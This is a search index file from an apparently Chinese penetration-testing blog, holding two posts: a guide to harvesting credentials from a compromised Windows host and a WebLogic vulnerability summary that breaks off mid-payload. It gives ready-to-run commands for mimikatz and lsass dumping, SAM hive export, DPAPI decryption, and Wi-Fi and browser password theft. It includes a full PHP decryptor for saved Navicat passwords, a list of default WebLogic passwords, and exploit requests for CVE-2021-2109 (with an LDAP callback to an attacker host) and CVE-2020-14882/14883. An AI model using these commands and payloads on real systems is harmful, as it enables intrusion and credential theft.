<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>内网信息收集之-windows</title>
      <link href="/2021/08/10/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B9%8B-windows/"/>
      <url>/2021/08/10/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B9%8B-windows/</url>
      
        <content type="html"><![CDATA[<h1 id="一、序言"><a href="#一、序言" class="headerlink" title="一、序言"></a>一、序言</h1><p>在日常渗透常常会碰到windows，在获取了一台windows主机后，我们要进行信息收集，获取在内网中的其他主机资产信息，以及相关账号密码等进行后续的渗透。</p><p>这边假设控制了一台windows主机，那我们如何对这一台主机进行尽量全的信息收集。</p><h1 id="二、收集内容"><a href="#二、收集内容" class="headerlink" title="二、收集内容"></a>二、收集内容</h1><h2 id="2-1、系统网络相关信息"><a href="#2-1、系统网络相关信息" class="headerlink" title="2.1、系统网络相关信息"></a>2.1、系统网络相关信息</h2><p>通过systeminfo来打印系统信息，可以看到包含系统信息、系统补丁、域、网卡信息等。</p><p> <img src="https://img.ex1t.xyz//systeminfo1.png" alt="systeminfo1"></p><h2 id="2-2、系统账号密码与登录凭据"><a href="#2-2、系统账号密码与登录凭据" class="headerlink" title="2.2、系统账号密码与登录凭据"></a>2.2、系统账号密码与登录凭据</h2><h3 id="2-2-1、抓取本地windows账号密码"><a href="#2-2-1、抓取本地windows账号密码" class="headerlink" title="2.2.1、抓取本地windows账号密码"></a>2.2.1、抓取本地windows账号密码</h3><p>（1）、直接上传mimikatz读取账号密码</p><pre class="line-numbers language-none"><code class="language-none">privilege::debugsekurlsa::logonpasswordsmimikatz.exe "sekurlsa::debug" "sekurlsa::logonPasswords"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>(2)导出lsass进程的内存文件</p><p>可能有waf上传不上去，通过procdump来导出lsass进程的内存文件。</p><pre class="line-numbers language-none"><code class="language-none">procdump64.exe  -accepteula -ma lsass.exe lsass.dmp  #导出为lsass.dump文件mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswordsfull" exit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>(3)注册表导出</p><pre class="line-numbers language-none"><code class="language-none">reg save HKLM\SYSTEM system.hivreg save HKLM\SAM sam.hivreg save hklm\security security.hiv<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">mimikatz.exe "lsadump::sam /system:system.hiv /sam:sam.hiv" exit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>或使用<a href="https://github.com/SecureAuthCorp/impacket">https://github.com/SecureAuthCorp/impacket</a></p><pre class="line-numbers language-none"><code class="language-none">python secretsdump.py -sam sam.hiv -security security.hiv -system system.hiv LOCAL<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p> <img src="https://img.ex1t.xyz//impacket.png" alt="impacket"></p><h3 id="2-2-2、抓取其他的登录凭据"><a href="#2-2-2、抓取其他的登录凭据" class="headerlink" title="2.2.2、抓取其他的登录凭据"></a>2.2.2、抓取其他的登录凭据</h3><pre class="line-numbers language-none"><code class="language-none">#查看mstsc的连接纪录cmdkey /list #查找本地的Credentials：dir /a %userprofile%\AppData\Local\Microsoft\Credentials\*<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p> 存在很多登录凭据</p><p> <img src="https://img.ex1t.xyz//cmdkey.png" alt="cmdkey"></p><p>#查找本地的Credentials：</p><p> <img src="https://img.ex1t.xyz//dir1.png" alt="dir1"></p><p>选其中一个来提取</p><p>管理员权限运行mimikatz.exe </p><pre class="line-numbers language-none"><code class="language-none">"privilege::debug" dpapi::cred  /in:C:\Users\Administrator\AppData\Local\Microsoft\Credentials\BF79E68DD4C78FB8BE8B2C6D69CFBEA7<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p> <img src="https://img.ex1t.xyz//apapi.png" alt="apapi"></p><p>执行找到guidMasterKey值对应的guid下的MasterKer值</p><pre class="line-numbers language-none"><code class="language-none">mimikatz.exe "privilege::debug" "sekurlsa::dpapi" &gt;1.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://img.ex1t.xyz//apapi-2.png" alt="apapi-2"></p><p>得到MasterKey</p><pre class="line-numbers language-none"><code class="language-none">mimikatz.exe "dpapi::cred /in:C:\Users\Administrator\AppData\Local\Microsoft\Credentials\BF79E68DD4C78FB8BE8B2C6D69CFBEA7 /masterkey:2a1761e64cf86ad5447ffa4ae7ea4f19f9c9c4acd56a9cf815f9d5a0be6dc5cc5aa044f47f704cdca9082661dba3f74f3a5fc77cc67957abbf1a2e944e3d656b"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>成功得到我的gitee的账号密码</p><p><img src="https://img.ex1t.xyz//apapi-3.png" alt="apapi-3"></p><h3 id="2-3-3、wifi密码"><a href="#2-3-3、wifi密码" class="headerlink" title="2.3.3、wifi密码"></a>2.3.3、wifi密码</h3><p>用的比较少，但还是提一下</p><p>批量显示wifi账号密码</p><pre class="line-numbers language-none"><code class="language-none">for /f "skip=9 tokens=1,2 delims=:" %i in ('netsh wlan show profiles') do @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="2-3、浏览器账号密码"><a href="#2-3、浏览器账号密码" class="headerlink" title="2.3、浏览器账号密码"></a>2.3、浏览器账号密码</h2><h3 id="2-3-1、浏览器各类文件地址"><a href="#2-3-1、浏览器各类文件地址" class="headerlink" title="2.3.1、浏览器各类文件地址"></a>2.3.1、浏览器各类文件地址</h3><h4 id="（1）、google"><a href="#（1）、google" class="headerlink" title="（1）、google"></a>（1）、google</h4><pre class="line-numbers language-none"><code class="language-none">书签：C:\Users\xx\AppData\Local\Google\Chrome\User Data\Default\Bookmarks Cookie: C:\Users\xx\AppData\Local\Google\Chrome\User Data\Default\Cookies 浏览历史：C:\Users\xx\AppData\Local\Google\Chrome\User Data\Default\History 当前的session：C:\Users\xx\AppData\Local\Google\Chrome\User Data\Default\Current Session 账号密码：C:\Users\xx\AppData\Local\Google\Chrome\User Data\Default\Login Data C:\Users\xx\AppData\Local\Google\Chrome\User Data\Profile 1\Login Data<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="（2）、QQ浏览器"><a href="#（2）、QQ浏览器" class="headerlink" title="（2）、QQ浏览器"></a>（2）、QQ浏览器</h4><pre class="line-numbers language-none"><code class="language-none">⽤户数据⽬录：C:\Users\xx\AppData\Local\Tencent\QQBrowser\User Data\Default 缓存⽬录：C:\Users\xx\AppData\Local\Google\Chrome\User Data\Default\Cache\ 各⽂件如下： 书签：C:\Users\xx\AppData\Local\Tencent\QQBrowser\User Data\Default\Bookmarks Cookie: C:\Users\xx\AppData\Local\Tencent\QQBrowser\User Data\Default\Cookies 浏览历史：C:\Users\xx\AppData\Local\Tencent\QQBrowser\User Data\Default\History 当前的session：C:\Users\xx\AppData\Local\Tencent\QQBrowser\User Data\Default\Current Session 账号密码：C:\Users\xx\AppData\Local\Tencent\QQBrowser\User Data\Default\Login Data 或 C:\Users\xx\AppData\Local\Tencent\QQBrowser\User Data\Default\xxxxxxxxxxx\6<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="（3）、360浏览器"><a href="#（3）、360浏览器" class="headerlink" title="（3）、360浏览器"></a>（3）、360浏览器</h4><pre class="line-numbers language-none"><code class="language-none">账号密码⽂件：C:\Users\xx\AppData\Roaming\360se6\User Data\Default\apps\LoginAssis\assis2.db<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="（4）、Firefox"><a href="#（4）、Firefox" class="headerlink" title="（4）、Firefox"></a>（4）、Firefox</h4><pre class="line-numbers language-none"><code class="language-none">账号密码⽂件： C:\Users\xx\AppData\Roaming\Mozilla\Firefox\Profiles\7s5izkwl.defaultrelease\logins.json<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="（5）、IE-Edge"><a href="#（5）、IE-Edge" class="headerlink" title="（5）、IE/Edge"></a>（5）、IE/Edge</h4><pre class="line-numbers language-none"><code class="language-none">书签⽂件：C:\Users\13910\Favorites\xx.url<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="2-3-2、浏览器账号密码提取"><a href="#2-3-2、浏览器账号密码提取" class="headerlink" title="2.3.2、浏览器账号密码提取"></a>2.3.2、浏览器账号密码提取</h3><pre class="line-numbers language-none"><code class="language-none">https://github.com/moonD4rk/HackBrowserData<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>windows/mac/linux都可以进行提取</p><pre class="line-numbers language-none"><code class="language-none">.\hack-browser-data.exe -h.\hack-browser-data.exe -b all -f json --dir results -cc<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>运行后会生成</p><pre class="line-numbers language-none"><code class="language-none">results/archive.zip<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>打开就有</p><p>存在cookie、password等</p><p> <img src="https://img.ex1t.xyz//hack-1.png" alt="hack-1"></p><p> <img src="https://img.ex1t.xyz//hack-2.png" alt="hack-2"></p><h2 id="2-4、文件信息"><a href="#2-4、文件信息" class="headerlink" title="2.4、文件信息"></a>2.4、文件信息</h2><p>有部分运维就会将账号密码存放在桌面文件中，仔细查看文件，或许就会有意想不到的收获。</p><h2 id="2-5、桌面软件保存信息"><a href="#2-5、桌面软件保存信息" class="headerlink" title="2.5、桌面软件保存信息"></a>2.5、桌面软件保存信息</h2><p>简单列出以下几个</p><h3 id="2-5-1、数据库连接工具Navicat"><a href="#2-5-1、数据库连接工具Navicat" class="headerlink" title="2.5.1、数据库连接工具Navicat"></a>2.5.1、数据库连接工具Navicat</h3><p>通过文件-&gt;导出连接</p><p>打开导出的文件，复制其中Password的值</p><p>在线代码执行网站：<a href="https://tool.lu/coderunner/">https://tool.lu/coderunner/</a> （登陆后才能用）</p><p>修改代码最下面的版本号与密文，运行得到结果</p><p><img src="https://img.ex1t.xyz//navicat.png" alt="navicat"></p><pre class="line-numbers language-none"><code class="language-none">&lt;?phpclass NavicatPassword{    protected $version = 0;    protected $aesKey = 'libcckeylibcckey';    protected $aesIv = 'libcciv libcciv ';    protected $blowString = '3DC5CA39';    protected $blowKey = null;    protected $blowIv = null;         public function __construct($version = 12)    {        $this-&gt;version = $version;        $this-&gt;blowKey = sha1('3DC5CA39', true);        $this-&gt;blowIv = hex2bin('d9c7c3c8870d64bd');    }         public function encrypt($string)    {        $result = FALSE;        switch ($this-&gt;version) {            case 11:                $result = $this-&gt;encryptEleven($string);                break;            case 12:                $result = $this-&gt;encryptTwelve($string);                break;            default:                break;        }                 return $result;    }         protected function encryptEleven($string)    {        $round = intval(floor(strlen($string) / 8));        $leftLength = strlen($string) % 8;        $result = '';        $currentVector = $this-&gt;blowIv;                 for ($i = 0; $i &lt; $round; $i++) {            $temp = $this-&gt;encryptBlock($this-&gt;xorBytes(substr($string, 8 * $i, 8), $currentVector));            $currentVector = $this-&gt;xorBytes($currentVector, $temp);            $result .= $temp;        }                 if ($leftLength) {            $currentVector = $this-&gt;encryptBlock($currentVector);            $result .= $this-&gt;xorBytes(substr($string, 8 * $i, $leftLength), $currentVector);        }                 return strtoupper(bin2hex($result));    }         protected function encryptBlock($block)    {        return openssl_encrypt($block, 'BF-ECB', $this-&gt;blowKey, OPENSSL_RAW_DATA|OPENSSL_NO_PADDING);    }         protected function decryptBlock($block)    {        return openssl_decrypt($block, 'BF-ECB', $this-&gt;blowKey, OPENSSL_RAW_DATA|OPENSSL_NO_PADDING);    }         protected function xorBytes($str1, $str2)    {        $result = '';        for ($i = 0; $i &lt; strlen($str1); $i++) {            $result .= chr(ord($str1[$i]) ^ ord($str2[$i]));        }                 return $result;    }         protected function encryptTwelve($string)    {        $result = openssl_encrypt($string, 'AES-128-CBC', $this-&gt;aesKey, OPENSSL_RAW_DATA, $this-&gt;aesIv);        return strtoupper(bin2hex($result));    }         public function decrypt($string)    {        $result = FALSE;        switch ($this-&gt;version) {            case 11:                $result = $this-&gt;decryptEleven($string);                break;            case 12:                $result = $this-&gt;decryptTwelve($string);                break;            default:                break;        }                 return $result;    }         protected function decryptEleven($upperString)    {        $string = hex2bin(strtolower($upperString));                 $round = intval(floor(strlen($string) / 8));        $leftLength = strlen($string) % 8;        $result = '';        $currentVector = $this-&gt;blowIv;                 for ($i = 0; $i &lt; $round; $i++) {            $encryptedBlock = substr($string, 8 * $i, 8);            $temp = $this-&gt;xorBytes($this-&gt;decryptBlock($encryptedBlock), $currentVector);            $currentVector = $this-&gt;xorBytes($currentVector, $encryptedBlock);            $result .= $temp;        }                 if ($leftLength) {            $currentVector = $this-&gt;encryptBlock($currentVector);            $result .= $this-&gt;xorBytes(substr($string, 8 * $i, $leftLength), $currentVector);        }                 return $result;    }         protected function decryptTwelve($upperString)    {        $string = hex2bin(strtolower($upperString));        return openssl_decrypt($string, 'AES-128-CBC', $this-&gt;aesKey, OPENSSL_RAW_DATA, $this-&gt;aesIv);    }};  //需要指定版本两种，11或12//$navicatPassword = new NavicatPassword(11);$navicatPassword = new NavicatPassword(11); //解密//$decode = $navicatPassword-&gt;decrypt('15057D7BA390');$decode = $navicatPassword-&gt;decrypt('E75BF077AB8BAA3AC2D5');echo $decode."\n";?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-5-2、Xshell"><a href="#2-5-2、Xshell" class="headerlink" title="2.5.2、Xshell"></a>2.5.2、Xshell</h3><p>存放地址</p><pre class="line-numbers language-none"><code class="language-none">XShell5%userprofile%\Documents\NetSarang\Xshell\SessionsXFtp5%userprofile%\Documents\NetSarang\Xftp\SessionsXShell6%userprofile%\Documents\NetSarang Computer\6\Xshell\SessionsXFtp6%userprofile%\Documents\NetSarang Computer\6\Xftp\Sessions<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p> <img src="https://img.ex1t.xyz//xshell.png" alt="xshell"></p><p>文本中存放的Password就是加密后的密文</p><p>解密脚本：</p><pre class="line-numbers language-none"><code class="language-none">https://github.com/HyperSine/how-does-Xmanager-encrypt-password<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">xshell解密：python3 XShellCryptoHelper.py -d -ver 6.0 lQilxEugvLFfghR5tNV3K9DKhmwArV+SbjWAcgZZzIDTnJ0JgCo=xftp解密：python3 XFtpCryptoHelper.py  -d -ver 6.0 xxxx/xxxxx=<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-5-3、向日葵"><a href="#2-5-3、向日葵" class="headerlink" title="2.5.3、向日葵"></a>2.5.3、向日葵</h3><pre class="line-numbers language-none"><code class="language-none">C:\Program Files (x86)\Oray\SunLogin\SunloginClient\SunloginClient.exe向日葵默认配置文件路径：安装版：C:\Program Files\Oray\SunLogin\SunloginClient\config.ini便携版(绿色版)：C:\ProgramData\Oray\SunloginClient\config.ini<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>读取配置文件[config.ini]</p><pre class="line-numbers language-none"><code class="language-none">[base]installautorun=nowindowuserpwd=0configpath=C:\Program Files (x86)\Oray\SunLogin\SunloginClient\config.initracksvr=encrypwd=SxudeIOP2vs=macaddress=20:F1:7C:B2:F3:12hasuu=0showupdatetip=1hostname=defaulthostdesc=level=levelname=levelchanel=istransfer=ismessage=expires=skin=sunlogincode=isfastcodelogin=1logintype=0license=01ad-c92c-eec3-ee58licensepsw=fastcode=k107xxxxxxfastcodepsw=etXDq1sXsrFkESG0RNxxxxxxxxxsunloginserver=rc10-fc05.oray.com:443slapiserver=slapi.oray.netaccount=language=0firstrun=0lastview=1openeyes=1screenshots_path=C:\Users\Administrator\Documents\Sunlogin Files[common]serviceonly=0autorun=1在ini中存在这两个关键字段fastcode=xxxxxxxxxxfastcodepsw=xxxxxxxxxxxxxxxxxxxxxxx其中fastcode为本机识别码encry_pwd为本机验证码但被加密解密encry_pwd，便可得出向日葵远程连接密码<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>解密脚本</p><pre class="line-numbers language-none"><code class="language-none">https://github.com/wafinfo/Sunflower_get_Password<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">python3 SunDecrypt.py 输入密文即可<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="2-5-4、TeamViewer"><a href="#2-5-4、TeamViewer" class="headerlink" title="2.5.4、TeamViewer"></a>2.5.4、TeamViewer</h3><p>这个用T00ls上的getTVpass.exe即可，就不多说了</p><h1 id="三、总结"><a href="#三、总结" class="headerlink" title="三、总结"></a>三、总结</h1><p>暂时想到的就这多了，各位大佬有什么新的想法欢迎提出。</p><p>如果本文章中存在什么问题，也敬请指正。关于文章中包含工具我已全部下载，若需要，可在公众号（诚默的每周学习总结）回复关键词：信息收集-windows，得到下载地址。</p><p>以上内容仅供学习交流</p>]]></content>
      
      
      
        <tags>
            
            <tag> 信息收集 </tag>
            
            <tag> 内网渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>weblogic漏洞总结</title>
      <link href="/2021/08/02/weblogic%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"/>
      <url>/2021/08/02/weblogic%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h1 id="一、Weblogic-介绍"><a href="#一、Weblogic-介绍" class="headerlink" title="一、Weblogic 介绍"></a>一、Weblogic 介绍</h1><p>​        WebLogic是美国Oracle公司出品的一个application server，确切的说是一个基于JAVAEE架构的中间件，WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。将Java的动态功能和Java Enterprise标准的安全性引入大型网络应用的开发、集成、部署和管理之中。</p><h1 id="二、漏洞相关"><a href="#二、漏洞相关" class="headerlink" title="二、漏洞相关"></a>二、漏洞相关</h1><h2 id="2-1、已收集漏洞"><a href="#2-1、已收集漏洞" class="headerlink" title="2.1、已收集漏洞"></a>2.1、已收集漏洞</h2><pre class="line-numbers language-none"><code class="language-none">Weblogic LDAP 远程代码执行漏洞 CVE-2021-2109Weblogic RCE CVE-2020-14882&amp;14883weblogic jndi注入CVE-2020-14841Weblogic coherence组件iiop反序列化漏洞 (CVE-2020-14644)WebLogic UniversalExtractor反序列化漏洞 CVE-2020-14645WebLogic CVE-2020-14756 T3IIOP反序列化RCEWeblogic 远程代码执行漏洞 CVE-2020-2883Weblogic CVE-2020-2551 IIOP协议反序列化rce Weblogic反序列化漏洞 CVE-2019-2890Weblogic反序列化远程代码执行漏洞CVE-2019-2725Weblogic反序列化漏洞 CVE-2019-2729Weblogic任意文件读取漏洞（CVE-2019-2615)）Weblogic 文件上传漏洞（CVE-2019-2618）weblogic 反序列化漏洞 CVE-2018-3252Weblogic反序列化远程代码执行漏洞 CVE-2018-3245Weblogic远程代码执行漏洞 CVE-2018-3191Weblogic任意文件上传漏洞（CVE-2018-2894）Weblogic WLS核心组件反序列化漏洞 CVE-2018-2893Weblogic WLS Core Components 反序列化命令执行漏洞 CVE-2018-2628WebLogic XMLDecoder反序列化漏洞（CVE-2017-10271）Weblogic 反序列化漏洞 CVE-2017-3506Weblogic 反序列化漏洞 CVE-2017-3248Weblogic SSRF漏洞 CVE-2014-4210<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="2-2、weblogic漏洞扫描工具"><a href="#2-2、weblogic漏洞扫描工具" class="headerlink" title="2.2、weblogic漏洞扫描工具"></a>2.2、weblogic漏洞扫描工具</h2><p><a href="https://github.com/0xn0ne/weblogicScanner">https://github.com/0xn0ne/weblogicScanner</a></p><p>可以检测以下漏洞</p><pre class="line-numbers language-none"><code class="language-none">weblogic administrator console、CVE-2014-4210、CVE-2016-0638、CVE-2016-3510、CVE-2017-3248、CVE-2017-3506、CVE-2017-10271、CVE-2018-2628、CVE-2018-2893、CVE-2018-2894、CVE-2018-3191、CVE-2018-3245、CVE-2018-3252、CVE-2019-2618、CVE-2019-2725、CVE-2019-2729、CVE-2019-2890、CVE-2020-2551、CVE-2020-14882、CVE-2020-14883<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="2-3、常用弱口令"><a href="#2-3、常用弱口令" class="headerlink" title="2.3、常用弱口令"></a>2.3、常用弱口令</h2><pre class="line-numbers language-none"><code class="language-none">weblogic    Oracl@123weblogicweblogicguestguestportaladminportaladminadminsecurityjoe       passwordmarypasswordsystemsecuritywlcsystemwlcsystemwlcsystemsipisystemsystem    password<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="2-4、通过任意文件读取来获取weblogic账号密码"><a href="#2-4、通过任意文件读取来获取weblogic账号密码" class="headerlink" title="2.4、通过任意文件读取来获取weblogic账号密码"></a>2.4、通过任意文件读取来获取weblogic账号密码</h2><p>假设通过以下可读取文件</p><pre class="line-numbers language-none"><code class="language-none">http://192.168.1.15:7001/hello/file.jsp?path=/etc/passwd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>weblogic密码使用AES（老版本3DES）加密，对称加密可解密，只需要找到用户的密文与加密时的密钥即可。这两个文件均位于base_domain下，名为SerializedSystemIni.dat和config.xml</p><p>SerializedSystemIni.dat是一个二进制文件，所以一定要用burpsuite来读取，用浏览器直接下载可能引入一些干扰字符。在burp里选中读取到的那一串乱码，右键copy to file就可以保存成一个文件：</p><p><img src="https://img.ex1t.xyz//weblogic-xz1.png" alt="weblogic-xz1"></p><p>密文获取</p><p>config.xml是base_domain的全局配置文件，找到其中的的值，即为加密后的管理员密码</p><p><img src="https://img.ex1t.xyz//weblogic-xz2.png" alt="weblogic-xz2"></p><p>解密密文即可</p><p>解密工具</p><pre class="line-numbers language-none"><code class="language-none">https://github.com/Ch1ngg/WebLogicPasswordDecryptorUi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="三、Weblogic-CVE漏洞"><a href="#三、Weblogic-CVE漏洞" class="headerlink" title="三、Weblogic-CVE漏洞"></a>三、Weblogic-CVE漏洞</h1><p>按照年份分下类</p><h2 id="3-1、2021年"><a href="#3-1、2021年" class="headerlink" title="3.1、2021年"></a>3.1、2021年</h2><pre class="line-numbers language-none"><code class="language-none">Weblogic LDAP 远程代码执行漏洞 CVE-2021-2109<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="3-1-1、CVE-2021-2109（Weblogic-LDAP-远程代码执行漏洞-）"><a href="#3-1-1、CVE-2021-2109（Weblogic-LDAP-远程代码执行漏洞-）" class="headerlink" title="3.1.1、CVE-2021-2109（Weblogic LDAP 远程代码执行漏洞 ）"></a>3.1.1、CVE-2021-2109（Weblogic LDAP 远程代码执行漏洞 ）</h3><h4 id="（1）、介绍"><a href="#（1）、介绍" class="headerlink" title="（1）、介绍"></a>（1）、介绍</h4><p>​        CVE-2021-2109 中，攻击者可构造恶意请求，造成JNDI注入，执行任意代码，从而控制服务器。</p><h4 id="（2）、影响版本"><a href="#（2）、影响版本" class="headerlink" title="（2）、影响版本"></a>（2）、影响版本</h4><pre class="line-numbers language-none"><code class="language-none">10.3.6.0.012.1.3.0.012.2.1.3.012.2.1.4.014.1.1.0.0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="（3）、利用"><a href="#（3）、利用" class="headerlink" title="（3）、利用"></a>（3）、利用</h4><p>下载工具(用于 JNDI注入 利用)：</p><pre class="line-numbers language-none"><code class="language-none">https://github.com/feihong-cs/JNDIExploit/releases/tag/v.1.11<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>执行</p><pre class="line-numbers language-none"><code class="language-none">java -jar JNDIExploit-v1.11.jar -i 192.168.204.131<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>exp执行ls命令</p><pre class="line-numbers language-none"><code class="language-none">POST /console/consolejndi.portal?_pageLabel=JNDIBindingPageGeneral&amp;_nfpb=true&amp;JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle(%22ldap://192.168.204;131:1389/Basic/WeblogicEcho;AdminServer%22) HTTP/1.1 Host: 192.168.204.131:49163 User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Connection: close cmd:ls Cookie: ADMINCONSOLESESSION=nM8lXW3nshhqyFuWs47qjIiQP0tUMtRYRHbBUFDXA8QIxRpdyNqr!964275826 Upgrade-Insecure-Requests: 1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="3-2、2020年"><a href="#3-2、2020年" class="headerlink" title="3.2、2020年"></a>3.2、2020年</h2><pre class="line-numbers language-none"><code class="language-none">Weblogic RCE CVE-2020-14882&amp;14883weblogic jndi注入CVE-2020-14841Weblogic coherence组件iiop反序列化漏洞 (CVE-2020-14644)WebLogic UniversalExtractor反序列化漏洞 CVE-2020-14645WebLogic CVE-2020-14756 T3IIOP反序列化RCEWeblogic 远程代码执行漏洞 CVE-2020-2883Weblogic CVE-2020-2551 IIOP协议反序列化rce <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3-2-1、-CVE-2020-14882-amp-14883（Weblogic-RCE）"><a href="#3-2-1、-CVE-2020-14882-amp-14883（Weblogic-RCE）" class="headerlink" title="3.2.1、 CVE-2020-14882&amp;14883（Weblogic RCE）"></a>3.2.1、 CVE-2020-14882&amp;14883（Weblogic RCE）</h3><h4 id="（1）、介绍-1"><a href="#（1）、介绍-1" class="headerlink" title="（1）、介绍"></a>（1）、介绍</h4><p>​        CVE-2020-14882允许未授权的用户绕过管理控制台的权限验证访问后台，CVE-2020-14883允许后台任意用户通过HTTP协议执行任意命令。使用这两个漏洞组成的利用链，可通过一个GET请求在远程Weblogic服务器上以未授权的任意用户身份执行命令。</p><h4 id="（2）、影响版本-1"><a href="#（2）、影响版本-1" class="headerlink" title="（2）、影响版本"></a>（2）、影响版本</h4><pre class="line-numbers language-none"><code class="language-none">10.3.6.0.012.1.3.0.012.2.1.3.012.2.1.4.014.1.1.0.0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="（3）、利用-1"><a href="#（3）、利用-1" class="headerlink" title="（3）、利用"></a>（3）、利用</h4><p>​        CVE-2020-14882：允许未授权的用户绕过管理控制台的权限验证访问后台</p><p>​        远程攻击者可以构造特殊的HTTP请求，在未经身份验证的情况下接管 WebLogic Server Console。</p><p>​        访问以下URL，未授权访问到管理后台页面（低权限的用户）：</p><pre class="line-numbers language-none"><code class="language-none">http://127.0.0.1:7001/console/css/%252e%252e%252fconsole.portal<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p> <img src="https://img.ex1t.xyz//CVE-2020-14882-1.png" alt="CVE-2020-14882-1"></p><p>目前是低权限用户，无法安装用户</p><p>CVE-2020-14883：允许后台任意用户通过HTTP协议执行任意命令</p><p>方法1</p><p>直接代码执行，创建文件</p><pre class="line-numbers language-none"><code class="language-none">127.0.0.1:70001/console/css/%252e%252e%252fconsole.portal?_nfpb=true&amp;_pageLabel=&amp;handle=com.tangosol.coherence.mvel2.sh.ShellSession("java.lang.Runtime.getRuntime().exec('touch%20/tmp/123');")<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>方法2</p><p>构建一个恶意的xml文件放在能访问到的web服务器上</p><pre class="line-numbers language-none"><code class="language-none">&lt;beans 